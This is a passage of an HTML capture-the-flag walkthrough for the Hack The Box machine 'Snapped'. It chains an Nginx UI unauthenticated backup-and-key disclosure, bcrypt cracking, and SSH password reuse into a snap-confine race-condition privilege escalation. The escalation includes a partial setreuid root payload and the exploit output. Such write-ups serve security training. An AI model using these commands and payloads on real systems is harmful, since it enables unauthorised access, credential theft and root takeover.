@@ -1,0 +1,958 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Snapped — HTB Hard Linux Walkthrough</title>
+<style>
+  @import url('https://fonts.googleapis.com/css2?family=Inter:wght@300;400;600;700;800;900&family=JetBrains+Mono:wght@400;500;700&display=swap');
+
+  :root {
+    --bg: #0a0e17;
+    --bg2: #111827;
+    --bg3: #1a2332;
+    --border: #1e293b;
+    --text: #e2e8f0;
+    --text-dim: #94a3b8;
+    --accent: #06b6d4;
+    --accent-glow: rgba(6, 182, 212, 0.3);
+    --green: #22c55e;
+    --green-glow: rgba(34, 197, 94, 0.2);
+    --red: #ef4444;
+    --orange: #f59e0b;
+    --purple: #a855f7;
+    --cyan: #22d3ee;
+    --pink: #f472b6;
+  }
+
+  * { margin: 0; padding: 0; box-sizing: border-box; }
+  
+  body {
+    font-family: 'Inter', sans-serif;
+    background: var(--bg);
+    color: var(--text);
+    line-height: 1.7;
+    overflow-x: hidden;
+  }
+
+  /* Animated Grid Background */
+  .bg-grid {
+    position: fixed;
+    top: 0; left: 0;
+    width: 100vw; height: 100vh;
+    background-image: 
+      linear-gradient(rgba(6, 182, 212, 0.03) 1px, transparent 1px),
+      linear-gradient(90deg, rgba(6, 182, 212, 0.03) 1px, transparent 1px);
+    background-size: 60px 60px;
+    pointer-events: none;
+    z-index: 0;
+  }
+
+  .bg-glow {
+    position: fixed;
+    top: -20%; left: -10%;
+    width: 60%; height: 60%;
+    background: radial-gradient(ellipse, rgba(6,182,212,0.06), transparent 70%);
+    pointer-events: none;
+    z-index: 0;
+    animation: floatGlow 20s ease-in-out infinite;
+  }
+
+  @keyframes floatGlow {
+    0%, 100% { transform: translate(0, 0) scale(1); }
+    33% { transform: translate(10%, 5%) scale(1.1); }
+    66% { transform: translate(-5%, 8%) scale(0.95); }
+  }
+
+  .container {
+    position: relative;
+    max-width: 1100px;
+    margin: 0 auto;
+    padding: 0 24px;
+    z-index: 1;
+  }
+
+  /* Hero Section */
+  .hero {
+    padding: 80px 0 60px;
+    text-align: center;
+    position: relative;
+  }
+
+  .hero-badge {
+    display: inline-flex;
+    align-items: center;
+    gap: 8px;
+    padding: 8px 20px;
+    background: rgba(6,182,212,0.1);
+    border: 1px solid rgba(6,182,212,0.3);
+    border-radius: 100px;
+    font-size: 13px;
+    font-weight: 600;
+    color: var(--accent);
+    letter-spacing: 0.5px;
+    margin-bottom: 28px;
+    animation: fadeInDown 0.8s ease-out;
+  }
+
+  .hero-badge .dot {
+    width: 8px; height: 8px;
+    background: var(--green);
+    border-radius: 50%;
+    animation: pulse 2s infinite;
+  }
+
+  @keyframes pulse {
+    0%, 100% { opacity: 1; transform: scale(1); }
+    50% { opacity: 0.5; transform: scale(0.8); }
+  }
+
+  .hero h1 {
+    font-size: clamp(48px, 8vw, 80px);
+    font-weight: 900;
+    letter-spacing: -2px;
+    background: linear-gradient(135deg, #e2e8f0 0%, #06b6d4 100%);
+    -webkit-background-clip: text;
+    -webkit-text-fill-color: transparent;
+    background-clip: text;
+    margin-bottom: 12px;
+    animation: fadeInUp 0.8s ease-out;
+  }
+
+  .hero .subtitle {
+    font-size: 20px;
+    color: var(--text-dim);
+    font-weight: 300;
+    animation: fadeInUp 0.8s ease-out 0.1s both;
+  }
+
+  .hero-meta {
+    display: flex;
+    justify-content: center;
+    gap: 40px;
+    margin-top: 36px;
+    flex-wrap: wrap;
+    animation: fadeInUp 0.8s ease-out 0.2s both;
+  }
+
+  .hero-meta .stat {
+    display: flex;
+    flex-direction: column;
+    align-items: center;
+  }
+
+  .hero-meta .stat .value {
+    font-size: 28px;
+    font-weight: 800;
+    background: linear-gradient(135deg, var(--accent), var(--purple));
+    -webkit-background-clip: text;
+    -webkit-text-fill-color: transparent;
+    background-clip: text;
+  }
+
+  .hero-meta .stat .label {
+    font-size: 12px;
+    color: var(--text-dim);
+    text-transform: uppercase;
+    letter-spacing: 1.5px;
+    font-weight: 600;
+  }
+
+  @keyframes fadeInUp {
+    from { opacity: 0; transform: translateY(20px); }
+    to { opacity: 1; transform: translateY(0); }
+  }
+
+  @keyframes fadeInDown {
+    from { opacity: 0; transform: translateY(-10px); }
+    to { opacity: 1; transform: translateY(0); }
+  }
+
+  /* Flag Display */
+  .flags-row {
+    display: flex;
+    gap: 20px;
+    justify-content: center;
+    flex-wrap: wrap;
+    margin: 40px 0;
+  }
+
+  .flag-card {
+    background: var(--bg2);
+    border: 1px solid var(--border);
+    border-radius: 12px;
+    padding: 20px 28px;
+    min-width: 280px;
+    position: relative;
+    overflow: hidden;
+    transition: all 0.3s ease;
+  }
+
+  .flag-card:hover {
+    border-color: var(--accent);
+    transform: translateY(-2px);
+    box-shadow: 0 8px 32px var(--accent-glow);
+  }
+
+  .flag-card .flag-label {
+    font-size: 11px;
+    text-transform: uppercase;
+    letter-spacing: 2px;
+    color: var(--text-dim);
+    font-weight: 600;
+  }
+
+  .flag-card .flag-value {
+    font-family: 'JetBrains Mono', monospace;
+    font-size: 14px;
+    color: var(--green);
+    margin-top: 8px;
+    word-break: break-all;
+  }
+
+  .flag-card.user { border-left: 3px solid var(--orange); }
+  .flag-card.root { border-left: 3px solid var(--red); }
+
+  .flag-card::before {
+    content: '✓';
+    position: absolute;
+    top: 12px; right: 16px;
+    font-size: 18px;
+    color: var(--green);
+    opacity: 0.6;
+  }
+
+  /* Section Styles */
+  .section {
+    margin: 60px 0;
+  }
+
+  .section-header {
+    display: flex;
+    align-items: center;
+    gap: 16px;
+    margin-bottom: 28px;
+    padding-bottom: 12px;
+    border-bottom: 1px solid var(--border);
+  }
+
+  .section-header .icon {
+    width: 40px; height: 40px;
+    border-radius: 10px;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    font-size: 20px;
+    flex-shrink: 0;
+  }
+
+  .section-header h2 {
+    font-size: 24px;
+    font-weight: 700;
+    letter-spacing: -0.5px;
+  }
+
+  .section-header .step-count {
+    margin-left: auto;
+    font-size: 13px;
+    color: var(--text-dim);
+    background: var(--bg2);
+    padding: 4px 14px;
+    border-radius: 100px;
+    border: 1px solid var(--border);
+  }
+
+  /* Timeline / Step Cards */
+  .step-card {
+    background: var(--bg2);
+    border: 1px solid var(--border);
+    border-radius: 14px;
+    padding: 28px;
+    margin-bottom: 20px;
+    position: relative;
+    transition: all 0.3s ease;
+  }
+
+  .step-card:hover {
+    border-color: rgba(6,182,212,0.4);
+    box-shadow: 0 4px 24px rgba(0,0,0,0.3);
+  }
+
+  .step-card .step-number {
+    position: absolute;
+    top: -12px; left: 24px;
+    background: var(--accent);
+    color: #000;
+    font-size: 12px;
+    font-weight: 800;
+    padding: 2px 14px;
+    border-radius: 100px;
+    letter-spacing: 1px;
+  }
+
+  .step-card .step-title {
+    font-size: 18px;
+    font-weight: 700;
+    margin-bottom: 6px;
+    margin-top: 4px;
+  }
+
+  .step-card .step-meta {
+    font-size: 13px;
+    color: var(--text-dim);
+    margin-bottom: 16px;
+  }
+  
+  .step-card .step-meta .cve {
+    display: inline-block;
+    background: rgba(239, 68, 68, 0.15);
+    color: var(--red);
+    padding: 2px 10px;
+    border-radius: 4px;
+    font-family: 'JetBrains Mono', monospace;
+    font-size: 12px;
+    font-weight: 600;
+  }
+
+  .step-card .step-meta .tag {
+    display: inline-block;
+    background: rgba(6,182,212,0.12);
+    color: var(--accent);
+    padding: 2px 10px;
+    border-radius: 4px;
+    font-size: 12px;
+    font-weight: 600;
+    margin-left: 6px;
+  }
+
+  /* Command Blocks */
+  .cmd-block {
+    background: #0d1117;
+    border: 1px solid #1e293b;
+    border-radius: 10px;
+    margin: 16px 0;
+    overflow: hidden;
+  }
+
+  .cmd-block .cmd-header {
+    display: flex;
+    justify-content: space-between;
+    align-items: center;
+    padding: 8px 16px;
+    background: #161b22;
+    border-bottom: 1px solid #1e293b;
+    font-size: 12px;
+    color: var(--text-dim);
+  }
+  
+  .cmd-block .cmd-header .lang { color: var(--cyan); font-weight: 600; }
+
+  .cmd-block pre {
+    padding: 16px;
+    font-family: 'JetBrains Mono', monospace;
+    font-size: 13px;
+    line-height: 1.6;
+    overflow-x: auto;
+    color: #e6edf3;
+  }
+
+  .cmd-block pre .prompt { color: var(--green); }
+  .cmd-block pre .comment { color: #8b949e; font-style: italic; }
+  .cmd-block pre .output { color: #f0e6d0; }
+  .cmd-block pre .highlight { color: var(--orange); }
+  .cmd-block pre .key { color: var(--pink); }
+  .cmd-block pre .str { color: var(--green); }
+  .cmd-block pre .num { color: var(--cyan); }
+
+  /* Output Blocks */
+  .output-block {
+    background: #0d1117;
+    border: 1px solid #1e293b;
+    border-left: 3px solid var(--accent);
+    border-radius: 0 10px 10px 0;
+    margin: 12px 0;
+    padding: 16px;
+    font-family: 'JetBrains Mono', monospace;
+    font-size: 13px;
+    line-height: 1.6;
+    color: #c9d1d9;
+    overflow-x: auto;
+  }
+
+  .output-block .ok { color: var(--green); }
+  .output-block .err { color: var(--red); }
+  .output-block .info { color: var(--cyan); }
+
+  /* CVE Cards */
+  .cve-card {
+    background: linear-gradient(135deg, rgba(239,68,68,0.08), rgba(168,85,247,0.08));
+    border: 1px solid rgba(239,68,68,0.25);
+    border-radius: 12px;
+    padding: 20px 24px;
+    margin: 16px 0;
+  }
+
+  .cve-card .cve-id {
+    font-family: 'JetBrains Mono', monospace;
+    font-size: 16px;
+    font-weight: 700;
+    color: var(--red);
+  }
+
+  .cve-card .cve-desc {
+    margin-top: 8px;
+    font-size: 14px;
+    color: var(--text-dim);
+  }
+
+  /* Architecture Diagram */
+  .arch-diagram {
+    background: var(--bg3);
+    border: 1px solid var(--border);
+    border-radius: 14px;
+    padding: 32px;
+    margin: 20px 0;
+    text-align: center;
+  }
+
+  .arch-diagram svg text { font-family: 'Inter', sans-serif; }
+
+  .arch-node {
+    display: inline-flex;
+    flex-direction: column;
+    align-items: center;
+    padding: 12px 24px;
+    border-radius: 8px;
+    margin: 6px;
+    font-size: 13px;
+    font-weight: 600;
+  }
+  .arch-node.nginx { background: rgba(6,182,212,0.15); border: 1px solid rgba(6,182,212,0.4); }
+  .arch-node.app { background: rgba(168,85,247,0.15); border: 1px solid rgba(168,85,247,0.4); }
+  .arch-node.db { background: rgba(34,197,94,0.15); border: 1px solid rgba(34,197,94,0.4); }
+  .arch-node.user { background: rgba(245,158,11,0.15); border: 1px solid rgba(245,158,11,0.4); }
+  .arch-node.snap { background: rgba(239,68,68,0.15); border: 1px solid rgba(239,68,68,0.4); }
+
+  .arch-arrow { color: var(--text-dim); font-size: 20px; margin: 0 8px; }
+
+  /* Timeline visualization */
+  .timeline-viz {
+    position: relative;
+    padding-left: 32px;
+    margin: 24px 0;
+  }
+
+  .timeline-viz::before {
+    content: '';
+    position: absolute;
+    left: 10px;
+    top: 0;
+    bottom: 0;
+    width: 2px;
+    background: linear-gradient(to bottom, var(--accent), var(--purple), var(--red));
+  }
+
+  .tl-item {
+    position: relative;
+    padding: 12px 0 12px 20px;
+    border-left: 2px solid transparent;
+  }
+
+  .tl-item::before {
+    content: '';
+    position: absolute;
+    left: -28px;
+    top: 18px;
+    width: 12px; height: 12px;
+    border-radius: 50%;
+    background: var(--bg2);
+    border: 2px solid var(--accent);
+  }
+
+  .tl-item.root::before { border-color: var(--red); background: rgba(239,68,68,0.3); }
+  .tl-item.foothold::before { border-color: var(--orange); }
+  .tl-item.recon::before { border-color: var(--accent); }
+
+  .tl-item .tl-title { font-weight: 600; font-size: 15px; }
+  .tl-item .tl-desc { font-size: 13px; color: var(--text-dim); }
+  .tl-item .tl-cmd { font-family: 'JetBrains Mono', monospace; font-size: 12px; color: var(--cyan); margin-top: 4px; }
+
+  /* Info Box */
+  .info-box {
+    background: rgba(6,182,212,0.08);
+    border: 1px solid rgba(6,182,212,0.2);
+    border-radius: 10px;
+    padding: 16px 20px;
+    margin: 16px 0;
+    font-size: 14px;
+  }
+
+  .info-box strong { color: var(--accent); }
+
+  .warning-box {
+    background: rgba(245,158,11,0.08);
+    border: 1px solid rgba(245,158,11,0.2);
+    border-radius: 10px;
+    padding: 16px 20px;
+    margin: 16px 0;
+    font-size: 14px;
+  }
+
+  /* Footer */
+  .footer {
+    text-align: center;
+    padding: 60px 0;
+    border-top: 1px solid var(--border);
+    margin-top: 60px;
+    color: var(--text-dim);
+    font-size: 14px;
+  }
+
+  .footer .sig {
+    font-family: 'JetBrains Mono', monospace;
+    color: var(--accent);
+    margin-top: 8px;
+  }
+
+  /* Responsive */
+  @media (max-width: 768px) {
+    .hero h1 { font-size: 36px; }
+    .hero-meta { gap: 20px; }
+    .step-card { padding: 20px; }
+    .flags-row { flex-direction: column; align-items: stretch; }
+    .flag-card { min-width: auto; }
+  }
+
+  /* Scrollbar */
+  ::-webkit-scrollbar { width: 8px; }
+  ::-webkit-scrollbar-track { background: var(--bg); }
+  ::-webkit-scrollbar-thumb { background: var(--border); border-radius: 4px; }
+  ::-webkit-scrollbar-thumb:hover { background: var(--text-dim); }
+
+  /* Credential Table */
+  .cred-table {
+    width: 100%;
+    border-collapse: collapse;
+    margin: 16px 0;
+    font-size: 14px;
+  }
+  .cred-table th {
+    background: var(--bg3);
+    padding: 12px 16px;
+    text-align: left;
+    font-weight: 600;
+    color: var(--text-dim);
+    font-size: 12px;
+    text-transform: uppercase;
+    letter-spacing: 1px;
+    border-bottom: 2px solid var(--border);
+  }
+  .cred-table td {
+    padding: 12px 16px;
+    border-bottom: 1px solid var(--border);
+    font-family: 'JetBrains Mono', monospace;
+    font-size: 13px;
+  }
+  .cred-table tr:hover td { background: rgba(6,182,212,0.04); }
+
+  .glow-text { color: var(--accent); text-shadow: 0 0 20px var(--accent-glow); }
+</style>
+</head>
+<body>
+
+<div class="bg-grid"></div>
+<div class="bg-glow"></div>
+
+<div class="container">
+
+<!-- Hero -->
+<section class="hero">
+  <div class="hero-badge">
+    <span class="dot"></span>
+    Hack The Box — Hard Linux
+  </div>
+  <h1>Snapped</h1>
+  <p class="subtitle">Two CVEs, one shell chain — from Nginx UI backup decryption to snap-confine TOCTOU race</p>
+  
+  <div class="hero-meta">
+    <div class="stat"><span class="value">5</span><span class="label">Phases</span></div>
+    <div class="stat"><span class="value">2</span><span class="label">CVEs</span></div>
+    <div class="stat"><span class="value">10.129.170.123</span><span class="label">Target</span></div>
+    <div class="stat"><span class="value">Ubuntu 24.04</span><span class="label">OS</span></div>
+  </div>
+
+  <div class="flags-row">
+    <div class="flag-card user">
+      <div class="flag-label">User Flag</div>
+      <div class="flag-value">5f28b2c0be7af53c8b373ea7ba98dd11</div>
+    </div>
+    <div class="flag-card root">
+      <div class="flag-label">Root Flag</div>
+      <div class="flag-value">43dd75679b26f1aa64a025e84bfd4ed7</div>
+    </div>
+  </div>
+</section>
+
+<!-- Architecture -->
+<section class="section">
+  <div class="section-header">
+    <div class="icon" style="background:rgba(6,182,212,0.12);">🏗</div>
+    <h2>Attack Surface</h2>
+    <span class="step-count">ports: 2</span>
+  </div>
+
+  <div class="arch-diagram" style="text-align:center;">
+    <div style="display:flex;flex-wrap:wrap;justify-content:center;align-items:center;gap:8px;">
+      <span class="arch-node user">🌐 Attacker<br><span style="font-weight:400;font-size:11px;color:var(--text-dim)">Kali Linux</span></span>
+      <span class="arch-arrow">⇢</span>
+      <span class="arch-node nginx">🔒 nginx 1.24.0<br><span style="font-weight:400;font-size:11px;color:var(--text-dim)">port 80</span></span>
+      <span class="arch-arrow">⇢</span>
+      <span class="arch-node app">⚙️ Nginx UI 2.3.2<br><span style="font-weight:400;font-size:11px;color:var(--text-dim)">Go backend → port 9000</span></span>
+      <span class="arch-arrow">⇢</span>
+      <span class="arch-node db">🗄 SQLite<br><span style="font-weight:400;font-size:11px;color:var(--text-dim)">users / bcrypt hashes</span></span>
+    </div>
+    <div style="display:flex;flex-wrap:wrap;justify-content:center;align-items:center;gap:8px;margin-top:24px;">
+      <span class="arch-node user">👤 jonathan<br><span style="font-weight:400;font-size:11px;color:var(--text-dim)">SSH / password reuse</span></span>
+      <span class="arch-arrow">⇢</span>
+      <span class="arch-node app">🔐 snap-confine (SUID)<br><span style="font-weight:400;font-size:11px;color:var(--text-dim)">CVE-2026-3888</span></span>
+      <span class="arch-arrow">⇢</span>
+      <span class="arch-node snap">💀 ROOT SHELL<br><span style="font-weight:400;font-size:11px;color:var(--green)">SUID bash → flag</span></span>
+    </div>
+  </div>
+</section>
+
+<!-- Kill Chain Timeline -->
+<section class="section">
+  <div class="section-header">
+    <div class="icon" style="background:rgba(168,85,247,0.12);">⚡</div>
+    <h2>Kill Chain</h2>
+    <span class="step-count">5 phases</span>
+  </div>
+
+  <div class="timeline-viz">
+    <div class="tl-item recon">
+      <div class="tl-title">Phase 1 — Reconnaissance</div>
+      <div class="tl-desc">nmap scan reveals ports 22 (SSH) and 80 (HTTP). Subdomain brute force discovers <strong>admin.snapped.htb</strong> running Nginx UI 2.3.2.</div>
+      <div class="tl-cmd">ffuf -u http://10.129.170.123 -H 'Host: FUZZ.snapped.htb' -w subdomains.txt</div>
+    </div>
+    <div class="tl-item recon">
+      <div class="tl-title">Phase 2 — Backup Extraction</div>
+      <div class="tl-desc">CVE-2026-27944: Unauthenticated <code>/api/backup</code> downloads an encrypted ZIP. Key/IV exposed in <code>X-Backup-Security</code> header. AES-256-CBC decrypts the SQLite database containing bcrypt password hashes.</div>
+      <div class="tl-cmd">openssl enc -aes-256-cbc -d -in nginx-ui.zip -out db.zip -K $KEY -iv $IV</div>
+    </div>
+    <div class="tl-item recon">
+      <div class="tl-title">Phase 3 — Credential Access</div>
+      <div class="tl-desc">Crack jonathan's bcrypt hash from the SQLite database with rockyou. Password: <strong>linkinpark</strong>. SSH access confirmed via password reuse.</div>
+      <div class="tl-cmd">hashcat -m 3200 hashes rockyou.txt</div>
+    </div>
+    <div class="tl-item foothold">
+      <div class="tl-title">Phase 4 — Foothold</div>
+      <div class="tl-desc">SSH as jonathan. User flag captured. System running Ubuntu 24.04 with snapd 2.63.1 — vulnerable to CVE-2026-3888.</div>
+      <div class="tl-cmd">sshpass -p linkinpark ssh jonathan@snapped.htb</div>
+    </div>
+    <div class="tl-item root">
+      <div class="tl-title">Phase 5 — Privilege Escalation</div>
+      <div class="tl-desc">CVE-2026-3888 snap-confine TOCTOU race condition. Replace ld-linux-x86-64.so.2 with a malicious payload that runs setreuid(0,0) + exec. After winning the race, SUID bash placed at /var/snap/firefox/common/bash.</div>
+      <div class="tl-cmd">/var/snap/firefox/common/bash -p → cat /root/root.txt</div>
+    </div>
+  </div>
+</section>
+
+<!-- CVE Details -->
+<section class="section">
+  <div class="section-header">
+    <div class="icon" style="background:rgba(239,68,68,0.12);">🔓</div>
+    <h2>Vulnerability Deep Dive</h2>
+    <span class="step-count">2 CVEs</span>
+  </div>
+
+  <div class="cve-card">
+    <div class="cve-id">CVE-2026-27944</div>
+    <div class="cve-desc">
+      <strong>Nginx UI Backup Disclosure</strong> — The <code>/api/backup</code> endpoint is accessible without authentication and exposes the AES-256-CBC encryption keys in the <code>X-Backup-Security</code> response header. An unauthenticated attacker can download the full system backup and decrypt it immediately, recovering user credentials, session tokens, SSL private keys, and Nginx configurations. Patched in version 2.3.3.
+    </div>
+  </div>
+
+  <div class="cmd-block">
+    <div class="cmd-header"><span class="lang">Exploitation</span> <span>curl + openssl</span></div>
+    <pre><span class="comment"># Download backup with key material</span>
+<span class="prompt">$</span> curl -v http://admin.snapped.htb/api/backup -o backup.zip
+<span class="output">X-Backup-Security: v6MVybpaJJ6L4DE4uQljSAd5JIVgdoyI1Cj7RTyyeV8=:xGJoMQ5IYESLQdSoYcwt3A==</span>
+
+<span class="comment"># Decrypt with openssl</span>
+<span class="prompt">$</span> KEY=$(echo <span class="str">'v6MVybpaJJ6L4DE4uQljSAd5JIVgdoyI1Cj7RTyyeV8='</span> | base64 -d | xxd -p -c 0)
+<span class="prompt">$</span> IV=$(echo <span class="str">'xGJoMQ5IYESLQdSoYcwt3A=='</span> | base64 -d | xxd -p -c 0)
+<span class="prompt">$</span> openssl enc -aes-256-cbc -d -in nginx-ui.zip -out dec.zip -K $KEY -iv $IV</pre>
+  </div>
+
+  <div class="cve-card" style="margin-top:24px;">
+    <div class="cve-id">CVE-2026-3888</div>
+    <div class="cve-desc">
+      <strong>snap-confine / systemd-tmpfiles TOCTOU Race</strong> — A race condition in snapd 2.63.1 on Ubuntu 24.04. snap-confine (SUID root) creates a private temp directory at <code>/tmp/.snap</code> for mount mimics. systemd-tmpfiles can delete this directory (4-minute timeout on Snapped). An attacker can recreate it with a malicious ld-linux-x86-64.so.2 payload that executes as root when the next snap sandbox is created.
+    </div>
+  </div>
+
+  <div class="cmd-block">
+    <div class="cmd-header"><span class="lang">Exploit Flow</span> <span>7-phase automated race</span></div>
+    <pre><span class="comment"># 1. Enter firefox snap sandbox (creates /tmp/.snap)</span>
+<span class="prompt">$</span> systemd-run --user --scope env -i SNAP_INSTANCE_NAME=firefox \
+  /usr/lib/snapd/snap-confine --base core22 \
+  snap.firefox.hook.configure /bin/sh -c <span class="str">"cd /tmp; sleep 86400"</span>
+
+<span class="comment"># 2. Wait for systemd-tmpfiles cleanup (4m timer)</span>
+<span class="comment"># 3. Destroy cached mount namespace</span>
+<span class="comment"># 4. Build .snap + .exchange dirs with librootshell.so as ld-linux</span>
+<span class="comment"># 5. Race: swap directories when snap-confine processes layout</span>
+<span class="comment"># 6. Trigger SUID snap-confine → loads poisoned ld-linux</span>
+<span class="comment"># 7. Payload runs setreuid(0,0) → cp /bin/bash → chmod 04755</span>
+
+<span class="prompt">#</span> <span class="highlight">Victory:</span>
+<span class="prompt">$</span> /var/snap/firefox/common/bash -p
+<span class="output highlight">bash-5.1# id</span>
+<span class="output">uid=1000(jonathan) gid=1000(jonathan) <span class="ok">euid=0(root)</span></span></pre>
+  </div>
+</section>
+
+<!-- Detailed Walkthrough -->
+<section class="section">
+  <div class="section-header">
+    <div class="icon" style="background:rgba(34,197,94,0.12);">📋</div>
+    <h2>Walkthrough</h2>
+    <span class="step-count">full chain</span>
+  </div>
+
+  <!-- Step 1 -->
+  <div class="step-card">
+    <div class="step-number">01</div>
+    <div class="step-title">🔍 Initial Recon</div>
+    <div class="step-meta"><span class="tag">nmap</span> <span class="tag">ffuf</span> <span class="tag">subdomain</span></div>
+    <p>nmap reveals two ports: 22 (OpenSSH 9.6p1) and 80 (nginx 1.24.0). The HTTP server redirects to <code>snapped.htb</code>. FFuF subdomain brute-force discovers <code>admin.snapped.htb</code> — an Nginx UI admin panel.</p>
+    <p>The main site is static HTML, but the admin panel has API endpoints and client-side JavaScript bundles revealing the version: <strong>Nginx UI 2.3.2</strong>.</p>
+
+    <div class="cmd-block">
+      <div class="cmd-header"><span class="lang">nmap</span><span>full port scan</span></div>
+      <pre><span class="prompt">$</span> sudo nmap -p- --min-rate 10000 10.129.170.123
+<span class="output">22/tcp open  ssh     OpenSSH 9.6p1
+80/tcp open  http    nginx 1.24.0</span>
+  
+<span class="prompt">$</span> ffuf -u http://10.129.170.123 -H 'Host: FUZZ.snapped.htb' -w subdomains.txt
+<span class="output">admin                   [Status: 200]</span></pre>
+    </div>
+  </div>
+
+  <!-- Step 2 -->
+  <div class="step-card">
+    <div class="step-number">02</div>
+    <div class="step-title">🔑 Backup Decryption (CVE-2026-27944)</div>
+    <div class="step-meta"><span class="cve">CVE-2026-27944</span> <span class="tag">AES-256-CBC</span> <span class="tag">backup</span></div>
+    <p>The <code>/api/backup</code> endpoint returns an encrypted ZIP archive. The <code>X-Backup-Security</code> response header contains the AES key and IV (base64-encoded, colon-separated).</p>
+    <p>The archive contains three encrypted files: <code>hash_info.txt</code>, <code>nginx-ui.zip</code>, and <code>nginx.zip</code>. The decrypted <code>nginx-ui.zip</code> extracts to <code>app.ini</code> (config) and <code>database.db</code> (SQLite with user hashes).</p>
+
+    <div class="cmd-block">
+      <div class="cmd-header"><span class="lang">bash</span><span>backup decryption</span></div>
+      <pre><span class="prompt">$</span> curl -s http://admin.snapped.htb/api/backup -o backup.zip
+<span class="prompt">$</span> unzip backup.zip -d backup
+<span class="output">inflating: backup/hash_info.txt
+inflating: backup/nginx-ui.zip
+inflating: backup/nginx.zip</span>
+
+<span class="comment"># Extract key material from header</span>
+<span class="prompt">$</span> KEY=<span class="str">"bfa315c9ba5a249e8be03138b90963480779248560768c88d428fb453cb2795f"</span>
+<span class="prompt">$</span> IV=<span class="str">"c46268310e4860448b41d4a861cc2ddc"</span>
+
+<span class="comment"># Decrypt</span>
+<span class="prompt">$</span> openssl enc -aes-256-cbc -d -in backup/nginx-ui.zip -out nginx-ui_dec.zip \
+  -K $KEY -iv $IV
+<span class="prompt">$</span> unzip nginx-ui_dec.zip -d nginx-ui
+<span class="output">inflating: nginx-ui/app.ini
+inflating: nginx-ui/database.db</span></pre>
+    </div>
+  </div>
+
+  <!-- Step 3 -->
+  <div class="step-card">
+    <div class="step-number">03</div>
+    <div class="step-title">🔓 Password Cracking</div>
+    <div class="step-meta"><span class="tag">SQLite</span> <span class="tag">bcrypt</span> <span class="tag">hashcat</span> <span class="tag">rockyou</span></div>
+    <p>The SQLite database has two users in the <code>users</code> table:</p>
+
+    <div class="output-block">
+| id | name     | password                                                         |
+|----|----------|------------------------------------------------------------------|
+| 1  | admin    | $2a$10$8YdBq4e.WeQn8gv9E0ehh.quy8D/4mXHHY4ALLMAzgFPTrIVltEvm |
+| 2  | jonathan | $2a$10$8M7JZSRLKdtJpx9YRUNTmODN.pKoBsoGCBi5Z8/WVGO2od9oCSyWq |
+    </div>
+
+    <p>hashcat with <code>-m 3200</code> cracks jonathan's bcrypt hash against rockyou.txt in seconds:</p>
+
+    <div class="cmd-block">
+      <div class="cmd-header"><span class="lang">hashcat</span><span>bcrypt crack</span></div>
+      <pre><span class="prompt">$</span> hashcat -m 3200 hashes /usr/share/wordlists/rockyou.txt
+<span class="output">$2a$10$8M7JZSRLKdtJpx9YRUNTmODN.pKoBsoGCBi5Z8/WVGO2od9oCSyWq:<span class="highlight">linkinpark</span></span></pre>
+    </div>
+
+    <div class="info-box">
+      <strong>Password Reuse</strong> — The same password works for SSH: <code>jonathan:linkinpark</code>
+    </div>
+  </div>
+
+  <!-- Step 4 -->
+  <div class="step-card">
+    <div class="step-number">04</div>
+    <div class="step-title">🐚 Foothold — SSH as jonathan</div>
+    <div class="step-meta"><span class="tag">SSH</span> <span class="tag">password reuse</span></div>
+    
+    <div class="cmd-block">
+      <div class="cmd-header"><span class="lang">SSH</span><span>foothold</span></div>
+      <pre><span class="prompt">$</span> sshpass -p <span class="str">linkinpark</span> ssh jonathan@snapped.htb
+<span class="output">Welcome to Ubuntu 24.04.4 LTS</span>
+<span class="prompt">jonathan@snapped:~$</span> cat user.txt
+<span class="output highlight">5f28b2c0be7af53c8b373ea7ba98dd11</span></pre>
+    </div>
+
+    <p>No sudo access. Snapd version 2.63.1 is installed — potentially vulnerable to CVE-2026-3888.</p>
+
+    <div class="output-block">
+<span class="info">$</span> snap version
+<span class="ok">snap    2.63.1+24.04</span>
+<span class="info">$</span> ls -la /usr/lib/snapd/snap-confine
+<span class="ok">-rwsr-xr-x 1 root root 159016 ... /usr/lib/snapd/snap-confine</span>
+    </div>
+  </div>
+
+  <!-- Step 5 -->
+  <div class="step-card">
+    <div class="step-number">05</div>
+    <div class="step-title">💀 Privilege Escalation — CVE-2026-3888</div>
+    <div class="step-meta"><span class="cve">CVE-2026-3888</span> <span class="tag">race condition</span> <span class="tag">TOCTOU</span> <span class="tag">SUID</span></div>
+
+    <p>This exploit leverages a time-of-check/time-of-use race in snap-confine's mount namespace initialization:</p>
+
+    <div class="warning-box">
+      <strong>How the race works:</strong> snap-confine processes a layout definition that references <code>/tmp/.snap/usr/lib/x86_64-linux-gnu</code> for bind-mounts. systemd-tmpfiles can delete <code>/tmp/.snap</code> (configured with a 4-minute age timeout). The exploit rebuilds <code>.snap</code> with a malicious <code>ld-linux-x86-64.so.2</code> and swaps directories during layout processing, so snap-confine bind-mounts the attacker's payload as root.
+    </div>
+
+    <div class="cmd-block">
+      <div class="cmd-header"><span class="lang">C</span><span>librootshell_suid.c — dynamic linker payload</span></div>
+      <pre><span class="comment">// Replaces ld-linux-x86-64.so.2</span>
+<span class="comment">// Compile: gcc -nostdlib -static -o librootshell.so librootshell_suid.c</span>
+<span class="key">void</span> <span class="highlight">_start</span>(<span class="key">void</span>) {
+    <span class="comment">/* setreuid(0, 0) — become root */</span>
+    __asm__ <span class="key">volatile</span> (
+        <span class="str">"xor %%rdi, %%rdi\n"</span>
+        <span class="str">"xor %%rsi, %%rsi\n"</span>
+        <span class="str">"mov $0x71, %%rax\n"</span>
+        <span class="str">"syscall\n"</span>
+    );
+    <span class="comment">/* execve("/tmp/sh", ...) — trigger escape script */</span>
+    ...
+}</pre>
+    </div>
+
+    <p>The exploit automates 7 phases — entrance, cleanup wait, namespace destruction, race, payload injection, trigger, and verification:</p>
+
+    <div class="output-block">
+<span class="info">================================================================</span>
+<span class="info">    CVE-2026-3888 — snap-confine / systemd-tmpfiles SUID LPE</span>
+<span class="info">================================================================</span>
+<span class="ok">[Phase 1] Entering Firefox sandbox...  → PID 3083</span>
+<span class="ok">[Phase 2] Waiting for .snap deletion... → done</span>
+<span class="ok">[Phase 3] Destroying cached mount namespace... → done</span>
+<span class="ok">[Phase 4] Race won! ld-linux owned by attacker</span>
+<span class="ok">[Phase 5] Payload injected (busybox, /tmp/sh, ld-linux)</span>
+<span class="ok">[Phase 6] SUID trigger → exit status 0</span>
+<span class="ok">[Phase 7] SUID root bash at /var/snap/firefox/common/bash</span>
+<span class="highlight">================================================================</span>
